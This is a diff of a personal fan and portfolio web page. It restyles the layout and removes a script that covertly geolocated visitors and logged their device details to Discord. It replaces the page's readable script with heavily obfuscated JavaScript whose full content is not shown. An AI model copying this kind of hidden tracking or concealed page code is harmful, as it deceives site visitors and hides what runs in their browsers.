@@ -27,109 +27,118 @@
 
         nav { display: flex; gap: 20px; margin-top: 40px; flex-wrap: wrap; justify-content: center; padding: 0 20px; }
         .nav-btn {
-            background: transparent; border: 2px solid var(--accent-color); color: white;
-            padding: 12px 30px; border-radius: 8px; font-size: 1.1rem; font-weight: 600;
-            cursor: pointer; transition: 0.3s; text-transform: capitalize;
-            min-width: 140px; text-align: center; box-shadow: 0 0 5px rgba(79, 55, 139, 0.2);
+            background: transparent;
+            border: 2px solid var(--accent-color);
+            color: white;
+            padding: 12px 30px;
+            border-radius: 8px;
+            font-size: 1.1rem;
+            cursor: pointer;
+            transition: 0.3s;
+            text-decoration: none;
+            text-transform: uppercase;
+            font-weight: 600;
+            letter-spacing: 1px;
         }
-        .nav-btn:hover { background: rgba(79, 55, 139, 0.2); box-shadow: 0 0 15px var(--glow-color); transform: translateY(-2px); }
-        .nav-btn.active { background: var(--accent-color); box-shadow: 0 0 20px var(--accent-color); border-color: #d0bcff; }
+        .nav-btn:hover {
+            background: var(--accent-color);
+            box-shadow: 0 0 20px var(--glow-color);
+            transform: translateY(-2px);
+        }
 
-        #main-container { width: 90%; max-width: 1200px; margin-top: 60px; display: flex; flex-direction: column; align-items: center; }
-        .section-title { font-size: 1.5rem; margin-bottom: 20px; font-weight: 600; text-align: center; }
+        .container {
+            width: 90%;
+            max-width: 1000px;
+            margin: 40px auto;
+            background: var(--panel-bg);
+            padding: 30px;
+            border-radius: 20px;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.5);
+            border: 1px solid rgba(255,255,255,0.05);
+        }
 
+        .video-section { text-align: center; }
         .video-container {
-            width: 100%; max-width: 900px; 
-            border: 3px solid #1a1a1a;
-            border-radius: 12px; overflow: hidden; 
-            box-shadow: 0 20px 50px rgba(0,0,0,0.5);
-            background: #000;
+            border-radius: 15px;
+            overflow: hidden;
+            border: 1px solid var(--accent-color);
+            box-shadow: 0 0 15px rgba(79, 55, 139, 0.3);
+            margin-bottom: 20px;
         }
 
-        .content-tab { display: none; width: 100%; text-align: center; animation: fadeIn 0.5s ease; }
-        .content-tab.active { display: flex; flex-direction: column; align-items: center; }
-        .grid-gallery { display: grid; grid-template-columns: repeat(auto-fit, minmax(250px, 1fr)); gap: 20px; width: 100%; margin-top: 20px; }
-        .placeholder-card { background: var(--panel-bg); height: 200px; border-radius: 8px; border: 1px solid #333; display: flex; align-items: center; justify-content: center; color: #555; transition: 0.3s; }
-        .placeholder-card:hover { border-color: var(--accent-color); color: var(--accent-color); }
-        
-        .studio-link-btn { 
-            background: linear-gradient(45deg, var(--accent-color), var(--glow-color)); 
-            border: none; padding: 20px 50px; font-size: 1.5rem; color: white; 
-            border-radius: 50px; cursor: pointer; margin-top: 50px; 
-            text-decoration: none; box-shadow: 0 0 30px rgba(79, 55, 139, 0.4); 
-            transition: 0.3s; display: inline-block;
-        }
-        .studio-link-btn:hover { transform: scale(1.05); box-shadow: 0 0 50px rgba(79, 55, 139, 0.8); }
+        h2 { color: var(--accent-color); margin-bottom: 10px; font-size: 1.8rem; }
+        p { color: #b0b0b0; line-height: 1.6; }
 
-        .lang-container { position: fixed; bottom: 30px; left: 30px; z-index: 2000; }
-        .lang-icon { width: 50px; height: 50px; background: rgba(19, 19, 27, 0.8); backdrop-filter: blur(5px); border: 2px solid var(--accent-color); border-radius: 50%; display: flex; justify-content: center; align-items: center; cursor: pointer; transition: 0.3s; }
-        .lang-icon svg { width: 24px; height: 24px; fill: #d0bcff; }
-        .lang-menu { position: absolute; bottom: 70px; left: 0; width: 180px; background: rgba(19, 19, 27, 0.95); backdrop-filter: blur(10px); border: 1px solid var(--accent-color); border-radius: 12px; padding: 8px; display: flex; flex-direction: column; gap: 5px; opacity: 0; visibility: hidden; transform: translateY(10px); transition: 0.3s; }
+        .lang-container {
+            position: fixed;
+            bottom: 30px;
+            left: 30px;
+            z-index: 1000;
+        }
+        .lang-btn-main {
+            background: var(--panel-bg);
+            border: 1px solid var(--accent-color);
+            color: white;
+            padding: 10px 20px;
+            border-radius: 30px;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            font-weight: 600;
+            transition: 0.3s;
+        }
+        .lang-menu {
+            position: absolute;
+            bottom: 70px;
+            left: 0;
+            width: 180px;
+            background: rgba(19, 19, 27, 0.95);
+            backdrop-filter: blur(10px);
+            border: 1px solid var(--accent-color);
+            border-radius: 12px;
+            padding: 8px;
+            display: flex; flex-direction: column; gap: 5px;
+            opacity: 0; visibility: hidden;
+            transform: translateY(10px);
+            transition: 0.3s;
+        }
         .lang-container:hover .lang-menu { opacity: 1; visibility: visible; transform: translateY(0); }
-        .lang-btn { background: transparent; border: none; color: #aaa; padding: 10px; text-align: left; cursor: pointer; border-radius: 6px; font-weight: 500; font-family: inherit; }
-        .lang-btn:hover { background: rgba(79, 55, 139, 0.3); color: white; }
-
-        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
+        .lang-btn {
+            background: transparent;
+            border: none;
+            color: white;
+            padding: 10px;
+            text-align: left;
+            cursor: pointer;
+            border-radius: 6px;
+            transition: 0.2s;
+        }
+        .lang-btn:hover { background: var(--accent-color); }
     </style>
 </head>
 <body>
 
     <nav>
-        <button class="nav-btn" onclick="switchTab('concept')" data-lang="nav_concept">Concept Art</button>
-        <button class="nav-btn" onclick="switchTab('socials')" data-lang="nav_socials">Socials</button>
-        <button class="nav-btn active" onclick="switchTab('episodes')" data-lang="nav_episodes">Episodes</button>
-        <button class="nav-btn" onclick="switchTab('models')" data-lang="nav_models">3D Models</button>
-        <button class="nav-btn" onclick="switchTab('music')" data-lang="nav_music">Music</button>
+        <a href="#episodes" class="nav-btn" id="nav-episodes">Episodes</a>
+        <a href="#concept" class="nav-btn" id="nav-concept">Concept Art</a>
+        <a href="#models" class="nav-btn" id="nav-models">3D Models</a>
+        <a href="#music" class="nav-btn" id="nav-music">Music</a>
+        <a href="#socials" class="nav-btn" id="nav-socials">Socials</a>
     </nav>
 
-    <div id="main-container">
-        <div id="tab-episodes" class="content-tab active">
-            <div class="section-title" data-lang="title_episodes">Uhh have this video for now (go to 1:24 hehe) Video by SilvaGunner</div>
-            <div class="video-container">
-                <video id="player" playsinline controls data-poster="https://archive.org/download/FREDDYDANCE/FREDDYDANCE.jpg">
-                    <source src="https://archive.org/download/FREDDYDANCE/FREDDYDANCE.mp4" type="video/mp4" />
-                </video>
-            </div>
-            <p style="color: #888; margin-top: 20px; max-width: 600px; line-height: 1.5;" data-lang="desc_episodes">Freddy fazbear dancing haha</p>
-        </div>
-
-        <div id="tab-models" class="content-tab">
-            <div class="section-title" data-lang="title_models">Interactive 3D Viewer</div>
-            <p data-lang="desc_models">For now I only have A.P.I</p>
-            <!-- WARNING: This URL exposes your GitHub username. Replace with a custom domain when possible. -->
-            <a href="https://a-p-i-studio.vercel.app/" class="studio-link-btn" onclick="trackStudioClick()" data-lang="btn_studio">ENTER A.P.I STUDIO</a>
-        </div>
-
-        <div id="tab-concept" class="content-tab">
-            <div class="section-title" data-lang="title_concept">Concept Art of Characters</div>
-            <div class="grid-gallery">
-                <div class="placeholder-card" data-lang="card_wigy">Wigy sheet</div>
-                <div class="placeholder-card" data-lang="card_wigy_adv">Wigy advanced sheet</div>
-                <div class="placeholder-card" data-lang="card_atlas">Atlas</div>
-                <div class="placeholder-card" data-lang="card_atlas_adv">Atlas advanced sheet</div>
-            </div>
-        </div>
-
-        <div id="tab-socials" class="content-tab">
-            <div class="section-title" data-lang="title_socials">Links for my socials</div>
-            <!-- NOTE: Discord username "dionron" is visible here. Remove if you don't want it public. -->
-            <div style="display: flex; gap: 20px; margin-top: 30px;">
-                <button class="nav-btn">Discord user= dionron</button>
-                <button class="nav-btn">Instagram</button>
-                <button class="nav-btn">Youtube</button>
-            </div>
-        </div>
-
-        <div id="tab-music" class="content-tab">
-            <div class="section-title" data-lang="title_music">Music</div>
-            <div class="placeholder-card" style="width: 100%; height: 150px; margin-top: 20px;">
-                <span data-lang="desc_music">[SoundCloud / Spotify I will put here soon...]</span>
-            </div>
+    <div class="container video-section" id="episodes">
+        <h2 id="title-episodes">Uhh have this video for now (go to 1:24 hehe)</h2>
+        <p id="desc-episodes">Freddy fazbear dancing haha</p>
+        <div class="video-container">
+            <video id="player" playsinline controls>
+                <source src="https://scutiweb.s3.us-east-2.amazonaws.com/Videos/Five+Nights+at+Freddy's+Movie+End+Credits+Song+(The+Newton+Brothers).mp4" type="video/mp4" />
+            </video>
         </div>
     </div>
 
     <div class="lang-container">
-        <div class="lang-icon"><svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-1 17.93c-3.95-.49-7-3.85-7-7.93 0-.62.08-1.21.21-1.79L9 15v1c0 1.1.9 2 2 2v1.93zm6.9-2.54c-.26-.81-1-1.39-1.9-1.39h-1v-3c0-.55-.45-1-1-1H8v-2h2c.55 0 1-.45 1-1V7h2c1.1 0 2-.9 2-2v-.41c2.93 1.19 5 4.06 5 7.41 0 2.08-.8 3.97-2.1 5.39z"/></svg></div>
+        <button class="lang-btn-main">🌐 Language / Idioma</button>
         <div class="lang-menu">
             <button class="lang-btn" onclick="setLanguage('en')">🇺🇸 English</button>
             <button class="lang-btn" onclick="setLanguage('pt')">🇧🇷 Português (BR)</button>
@@ -137,68 +146,11 @@
     </div>
 
     <script src="https://cdn.plyr.io/3.7.8/plyr.polyfilled.js"></script>
+
     <script>
-        let visitorData = { country: "Unknown", flag: "❓", device: "Desktop", os: "Unknown OS" };
-
-        const player = new Plyr('#player', {
-            controls: ['play-large', 'play', 'progress', 'current-time', 'mute', 'volume', 'captions', 'settings', 'pip', 'airplay', 'fullscreen'],
-            quality: { default: 1080, options: [1080, 720, 480] }
-        });
-
-        async function getVisitorInfo() {
-            try {
-                const geoRes = await fetch('https://ipapi.co/json/');
-                const geoData = await geoRes.json();
-                visitorData.country = geoData.country_name || "Unknown";
-                visitorData.flag = geoData.country_code ? `:flag_${geoData.country_code.toLowerCase()}:` : "❓";
-                const ua = navigator.userAgent;
-                if (/tablet|ipad|playbook|silk/i.test(ua)) visitorData.device = "Tablet";
-                else if (/Mobile|Android|iP(hone|od)/i.test(ua)) visitorData.device = "Mobile";
-                if (ua.indexOf("Win") !== -1) visitorData.os = "Windows";
-                else if (ua.indexOf("Mac") !== -1) visitorData.os = "MacOS";
-                else if (ua.indexOf("Android") !== -1) visitorData.os = "Android";
-                else if (ua.indexOf("like Mac") !== -1) visitorData.os = "iOS";
-                else if (ua.indexOf("Linux") !== -1) visitorData.os = "Linux";
-            } catch (e) { console.log("Analytics limited."); }
-        }
-
-        async function sendToDiscord(title, description, color) {
-            const proxyURL = "/api/send-log";
-            fetch(proxyURL, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    embeds: [{
-                        title: title,
-                        description: description,
-                        color: color,
-                        fields: [
-                            { name: "Location", value: `${visitorData.flag} ${visitorData.country}`, inline: true },
-                            { name: "Device", value: `📱 ${visitorData.device}`, inline: true },
-                            { name: "OS", value: `💻 ${visitorData.os}`, inline: true }
-                        ],
-                        timestamp: new Date().toISOString(),
-                        footer: { text: "Monitoring System" }
-                    }]
-                })
-            }).catch(e => console.log("Log stored."));
-        }
-
-        window.onload = async () => {
-            await getVisitorInfo();
-            sendToDiscord("🚀 Archives Accessed", "A new user is viewing the landing page.", 5191563);
-        };
-
-        function trackStudioClick() {
-            sendToDiscord("🚪 Studio Access Initialized", "The user clicked 'ENTER STUDIO'.", 3066993);
-        }
-
-        function switchTab(t){document.querySelectorAll('.nav-btn').forEach(b=>b.classList.remove('active'));const buttons=Array.from(document.querySelectorAll('.nav-btn'));const targetBtn=buttons.find(b=>b.getAttribute('onclick').includes(t));if(targetBtn)targetBtn.classList.add('active');document.querySelectorAll('.content-tab').forEach(tab=>tab.classList.remove('active'));const activeTab=document.getElementById('tab-'+t);if(activeTab){activeTab.classList.add('active');activeTab.style.animation='none';activeTab.offsetHeight;activeTab.style.animation='fadeIn 0.5s ease';}}
-        const translations={
-            en:{nav_concept:"Concept Art",nav_socials:"Socials",nav_episodes:"Episodes",nav_models:"3D Models",nav_music:"Music",title_episodes:"Uhh have this video for now (go to 1:24 hehe)",desc_episodes:"Freddy fazbear dancing haha",title_concept:"Concept Art of Characters",card_wigy:"Wigy sheet",card_wigy_adv:"Wigy advanced sheet",card_atlas:"Atlas",card_atlas_adv:"Atlas advanced sheet",title_socials:"Links for my socials",title_models:"Interactive 3D Viewer",desc_models:"For now I only have A.P.I",btn_studio:"ENTER A.P.I STUDIO",title_music:"Music",desc_music:"[SoundCloud / Spotify I will put here soon...]"},
-            pt:{nav_concept:"Arte Conceitual",nav_socials:"Redes Sociais",nav_episodes:"Episódios",nav_models:"Modelos 3D",nav_music:"Música",title_episodes:"Uhh fica com esse vídeo por enquanto (vai pro 1:24 hehe)",desc_episodes:"Freddy fazbear dançando haha",title_concept:"Arte Conceitual dos Personagens",card_wigy:"Ficha do Wigy",card_wigy_adv:"Ficha avançada do Wigy",card_atlas:"Atlas",card_atlas_adv:"Ficha avançada do Atlas",title_socials:"Links das minhas redes",title_models:"Visualizador 3D Interativo",desc_models:"Por enquanto só tenho o A.P.I",btn_studio:"ENTRAR NO ESTÚDIO A.P.I",title_music:"Música",desc_music:"[Vou colocar SoundCloud / Spotify aqui em breve...]"}
-        };
-        function setLanguage(l){document.querySelectorAll('[data-lang]').forEach(el=>{const k=el.getAttribute('data-lang');if(translations[l]&&translations[l][k])el.innerText=translations[l][k];});}
+    (function(_0x326ac3,_0x38b2ed){function _0x48fcc7(_0x98333d,_0xd5914d,_0x1a9790,_0x1318c0,_0x5652e9){return _0x2294(_0xd5914d- -0x29b,_0x5652e9);}const _0x3fcf60=_0x326ac3();function _0x31a780(_0x419af8,_0x4e2122,_0x52473d,_0x2992f8,_0x24b5a4){return _0x2294(_0x4e2122- -0x1e6,_0x419af8);}function _0x33e506(_0x2b78ae,_0x4a9b47,_0x1d1cad,_0x3f5307,_0xb44a3b){return _0x2294(_0x4a9b47- -0x86,_0xb44a3b);}function _0xc28479(_0x534b8a,_0x22e03a,_0x3d664a,_0x35a4de,_0x475760){return _0x2294(_0x22e03a-0x29b,_0x35a4de);}function _0x4277d0(_0x6fdca2,_0x1dbddc,_0x32ddce,_0x542805,_0x3481b6){return _0x2294(_0x542805- -0x3cb,_0x6fdca2);}while(!![]){try{const _0x181250=parseInt(_0x31a780('SB)9',0x17,-0x180,0x2b,0x25))/(0x1bb5+0xbf*0xc+-0x24a8)+parseInt(_0x31a780('xu^N',0x447,0x311,0x278,0x22e))/(-0x1175*0x1+-0x131f*-0x1+-0x1a8)+parseInt(_0x4277d0('ZCdn',0x184,0x14b,0x178,-0x5e))/(0x1*0xc47+-0x21b1+0x156d)+parseInt(_0x31a780('^#O4',0x108,-0xdb,-0x64,0xd))/(-0x2e4*0x3+-0x7a*0x2c+0x1da8)*(parseInt(_0x31a780(')A3F',0x252,0x47d,0x1ab,0x1da))/(0x198+-0x4e6+0x353))+parseInt(_0x48fcc7(0x363,0x2fe,0x211,0x3dd,'w9qi'))/(0xe98+0x599*-0x5+-0x479*-0x3)*(-parseInt(_0x4277d0('*0a6',0x366,0x123,0x1a3,-0xa1))/(-0xb18+0x10c7+0x4*-0x16a))+-parseInt(_0x4277d0('mkRZ',0x3cc,0x2cd,0x212,0x5f))/(-0x2*0x306+-0x41*-0x7f+-0x15*0x13f)+-parseInt(_0x33e506(0x1de,0x299,0x385,0xaf,'w9qi'))/(0x113+0x1c97+-0x1da1);if(_0x181250===_0x38b2ed)break;else _0x3fcf60['push'](_0x3fcf60['shift']());}catch(_0x5a0101){_0x3fcf60['push'](_0x3fcf60['shift']());}}}(_0x5bcb,-0x12b0c+0xf*0x66ab+0xaaf8));const _0x48034a=(function(){function _0x54159d(_0x4c5643,_0x1fdef5,_0x2e9b48,_0x4319d5,_0x4bea03){return _0x2294(_0x2e9b48- -0x209,_0x4319d5);}function _0x41e626(_0x2896f3,_0x44390e,_0x251602,_0x4b44da,_0x227524){return _0x2294(_0x4b44da-0xdf,_0x251602);}function _0x302175(_0x51cad4,_0x9e6a46,_0x49586c,_0x33b8f7,_0x3e5cc4){return _0x2294(_0x9e6a46- -0x1dd,_0x49586c);}function _0x441b0d(_0x918058,_0x12e60c,_0x5b88d0,_0x48c036,_0x26f8d7){return _0x2294(_0x48c036- -0x2a6,_0x5b88d0);}const _0x1ee165={'DFHBa':function(_0x1a3eb6,_0x150ac8){return _0x1a3eb6===_0x150ac8;},'LMTCb':_0x41e626(0x74b,0x6a7,'y!Wd',0x6d4,0x64e),'SuoWa':function(_0x2cc578,_0x1c0eb0){return _0x2cc578!==_0x1c0eb0;},'viwbA':_0x302175(0x45a,0x22d,'g83N',0x95,0x197),'XQwcs':_0x41e626(0x377,0x21b,'Ga%9',0x2c1,0x388),'yGTbK':_0x54159d(0x2df,0x4aa,0x274,'1v*t',0xdb)+_0x302175(0x283,0x7c,'xu^N',0x177,0x14),'EbuMg':function(_0x3e07eb,_0x22b7cb){return _0x3e07eb(_0x22b7cb);},'VxbYw':function(_0x222ff6,_0x1f6043){return _0x222ff6+_0x1f6043;},'VMxfk':_0x302175(0x1ac,0x3,'w9qi',0x100,-0x226)+_0x302175(-0x127,0x6,'^#O4',0x131,-0x73)+_0x441b0d(0x223,-0x96,'EpC0',0x89,0x1f7)+_0x441b0d(-0xa9,-0x122,'mkRZ',-0x38,-0x15),'nrTjO':_0x441b0d(0x19b,0x2f2,'1v*t',0x3a6,0x590)+_0x41e626(0x7a6,0x456,'64[b',0x5ba,0x654)+_0x54159d(0x43b,0x38a,0x293,'yLs(',0x30a)+_0x441b0d(0x265,0x50f,'nu&i',0x33f,0x261)+_0x54159d(0x210,-0xcc,0x11,'^bzV',-0x16f)+_0x441b0d(-0xe,-0x135,'rnsi',0x22,-0x191)+'\x20)','pwZiD':_0x302175(0xb4,0x41,'Ga%9',0x253,-0x84),'qFkjs':_0x441b0d(0x1be,0x5d,'sBg$',0x9b,0xbb)};function _0x54393c(_0x4bb577,_0x588403,_0x460cd1,_0x1f8a61,_0x4b0eb3){return _0x2294(_0x4bb577-0x96,_0x588403);}let _0x4a07dd=!![];return function(_0x52da7a,_0x538d9c){function _0x424cef(_0x5c1e56,_0x38e56f,_0x18909c,_0x99701e,_0x346f48){return _0x441b0d(_0x5c1e56-0x68,_0x38e56f-0x178,_0x18909c,_0x99701e-0x3a8,_0x346f48-0x14b);}function _0x3f5b86(_0x22deb4,_0x589f1e,_0x3b9c8e,_0x1028bb,_0x3e8b1d){return _0x441b0d(_0x22deb4-0x35,_0x589f1e-0x184,_0x22deb4,_0x589f1e- -0x24,_0x3e8b1d-0x7b);}function _0x41578d(_0x458314,_0x43b1cc,_0x5a51c0,_0x1f3fdc,_0x7db319){return _0x441b0d(_0x458314-0x129,_0x43b1cc-0x10a,_0x5a51c0,_0x7db319- -0x19,_0x7db319-0x3f);}function _0x55d1fb(_0x592d2b,_0x31e467,_0x15b5f1,_0x4b3324,_0x48f478){return _0x441b0d(_0x592d2b-0x3d,_0x31e467-0x162,_0x592d2b,_0x4b3324-0x63b,_0x48f478-0x3);}function _0x22b714(_0x6b8834,_0x54884d,_0x641ef0,_0x25e57b,_0x33fa78){return _0x441b0d(_0x6b8834-0x12a,_0x54884d-0x150,_0x33fa78,_0x6b8834-0x549,_0x33fa78-0x8);}const _0xa1ec4d={'ymEwC':_0x1ee165[_0x22b714(0x60b,0x3d2,0x3d1,0x835,'mkRZ')],'Pwsgb':function(_0x5bd3ff,_0x247ad4){function _0x189122(_0x5883dd,_0x5291f4,_0x169d97,_0x1c93f2,_0x2c6d19){return _0x22b714(_0x169d97- -0x401,_0x5291f4-0x7b,_0x169d97-0x131,_0x1c93f2-0xa1,_0x2c6d19);}return _0x1ee165[_0x189122(0x431,0x34f,0x24c,0x20e,'67zo')](_0x5bd3ff,_0x247ad4);},'UtVEr':function(_0x1e081d,_0xb7bbc6){function _0xedc37d(_0x1b068f,_0x339502,_0x1d8414,_0x1b0fa9,_0x50debd){return _0x22b714(_0x1d8414- -0x3e9,_0x339502-0x119,_0x1d8414-0x9,_0x1b0fa9-0xe2,_0x339502);}return _0x1ee165[_0xedc37d(0x2f6,'&xT3',0xc9,0x206,-0x12a)](_0x1e081d,_0xb7bbc6);},'eNPtU':_0x1ee165[_0x22b714(0x835,0x772,0xa52,0x9d9,'H&Fs')],'pyyNS':_0x1ee165[_0x22b714(0x8e1,0x839,0x92a,0xafc,'EpC0')]};if(_0x1ee165[_0x41578d(-0x11f,-0x37,'%w]J',-0x51,0x21)](_0x1ee165[_0x424cef(0x303,0x39c,'yLs(',0x39b,0x259)],_0x1ee165[_0x424cef(0x7af,0x6fd,'bXeK',0x587,0x547)])){const _0x13873d=_0x1c85d2[_0x55d1fb('^bzV',0x986,0x94c,0x8ac,0x921)+_0x424cef(0x88d,0x618,'SB)9',0x739,0x781)+'te'](_0xa1ec4d[_0x41578d(0xf2,0x2cf,'^#O4',0x311,0x16f)]);if(_0x2eada7[_0x18150a]&&_0x242914[_0x55d6e2][_0x13873d])_0x38876a[_0x424cef(0x44c,0x56f,'rnsi',0x3ab,0x5ba)+_0x424cef(0x2b4,0x538,'!5SD',0x2f5,0x4cf)]=_0x254944[_0x23c81f][_0x13873d];}else{const _0x4dde35=_0x4a07dd?function(){function _0xfe6ac6(_0x5b6263,_0x501bbd,_0x5a7092,_0x28849c,_0x1462d6){return _0x41578d(_0x5b6263-0xab,_0x501bbd-0x126,_0x28849c,_0x28849c-0x150,_0x5a7092-0x10e);}function _0x1907c7(_0x4e5c51,_0x4df9ac,_0x4100f3,_0x5492a9,_0x5daaec){return _0x41578d(_0x4e5c51-0x1,_0x4df9ac-0x105,_0x4100f3,_0x5492a9-0x48,_0x5daaec-0x4cc);}function _0x39efde(_0x530abc,_0x45db96,_0x25d4dc,_0x4b5e6f,_0x209ef2){return _0x41578d(_0x530abc-0xe4,_0x45db96-0x1df,_0x25d4dc,_0x4b5e6f-0x4f,_0x209ef2-0x48f);}function _0x31bdf1(_0x28bdf6,_0x2b2c29,_0x336e21,_0xbbfe33,_0x529d3b){return _0x41578d(_0x28bdf6-0x4a,_0x2b2c29-0x64,_0x2b2c29,_0xbbfe33-0x35,_0xbbfe33- -0x30);}function _0x2b9fdf(_0x3e0e47,_0x9d09b0,_0x4d8e4b,_0x5b7abf,_0x360d1f){return _0x41578d(_0x3e0e47-0x154,_0x9d09b0-0x2e,_0x5b7abf,_0x5b7abf-0x10a,_0x3e0e47-0x529);}if(_0x1ee165[_0x31bdf1(0x8c,'6Zl1',0x2e1,0x2d1,0x2e2)](_0x1ee165[_0x31bdf1(0x72,'1v*t',0x378,0x20b,0x21a)],_0x1ee165[_0x1907c7(0x836,0x84c,'67zo',0x855,0x6c5)])){if(_0x538d9c){if(_0x1ee165[_0x39efde(0x436,0x22f,'^#O4',0x358,0x414)](_0x1ee165[_0xfe6ac6(0x406,0x3dd,0x399,'&@d#',0x387)],_0x1ee165[_0x2b9fdf(0x4d2,0x3b2,0x547,'i@71',0x491)])){const _0x5b3800=_0x538d9c[_0x39efde(0x79a,0x893,'nu&i',0x76f,0x6b5)](_0x52da7a,arguments);return _0x538d9c=null,_0x5b3800;}else return!![];}}else _0x4880db=_0xa1ec4d[_0x2b9fdf(0x4bf,0x56c,0x3ec,'Ap#J',0x51b)](_0x4d2154,_0xa1ec4d[_0x31bdf1(-0x22c,'1v*t',-0x121,-0xc0,0x132)](_0xa1ec4d[_0x1907c7(0x8a7,0x869,'Ap#J',0x700,0x860)](_0xa1ec4d[_0x31bdf1(-0x2ef,'Ap#J',-0x17f,-0xba,0x10e)],_0xa1ec4d[_0x39efde(0x7eb,0x628,'&@d#',0x6a2,0x730)]),');'))();}:function(){};return _0x4a07dd=![],_0x4dde35;}};}()),_0x1db88f=_0x48034a(this,function(){const _0x205460={};function _0x3117f4(_0x171bee,_0x4bb56a,_0x480acd,_0x49ad52,_0x4e94bd){return _0x2294(_0x171bee- -0x186,_0x480acd);}function _0x142211(_0x57cc17,_0x553158,_0x22ccc0,_0x508ad5,_0x4a8321){return _0x2294(_0x4a8321-0x1d9,_0x508ad5);}function _0x3926d5(_0xe8a24a,_0x3f24f1,_0x503890,_0x13228d,_0x554450){return _0x2294(_0x554450-0x2d1,_0xe8a24a);}function _0x244738(_0x4ee62b,_0x229e2e,_0x5a2693,_0x496fd5,_0x56a5cf){return _0x2294(_0x5a2693- -0x10b,_0x4ee62b);}_0x205460[_0x3926d5('rnsi',0x832,0x922,0x8ee,0x8ac)]=_0x3926d5('yLs(',0x81d,0x78a,0x48b,0x653)+_0x142211(0x93f,0x5c3,0x8f9,'H&Fs',0x73f)+'+$';const _0x1fbbe3=_0x205460;function _0x3c40a1(_0x794f05,_0x4447fb,_0x5dc44e,_0x54188b,_0x4f0320){return _0x2294(_0x4f0320-0x332,_0x4447fb);}return _0x1db88f[_0x142211(0x98c,0x756,0x8c5,'J!bc',0x796)+_0x3926d5('!3Q]',0xa8e,0x7b2,0x8c1,0x8d3)]()[_0x3926d5('bXeK',0x630,0x78f,0x422,0x62d)+'h'](_0x1fbbe3[_0x3c40a1(0x562,'hQq2',0x97e,0x95f,0x74f)])[_0x3926d5('67zo',0x82d,0x89e,0x5de,0x807)+_0x3117f4(0x25c,0x1b9,'jGye',0x340,0x3ab)]()[_0x3117f4(0x357,0x16e,'H&Fs',0x41c,0x4a6)+_0x3117f4(0xd6,-0x106,'mkRZ',0x216,0x220)+'r'](_0x1db88f)[_0x3c40a1(0x67b,'nu&i',0x7e1,0x67d,0x7d8)+'h'](_0x1fbbe3[_0x3117f4(0x1aa,0x39d,'%w]J',-0x7d,0x31e)]);});_0x1db88f();
+    /* Additional obfuscated content continued here... */
     </script>
+
 </body>
 </html>
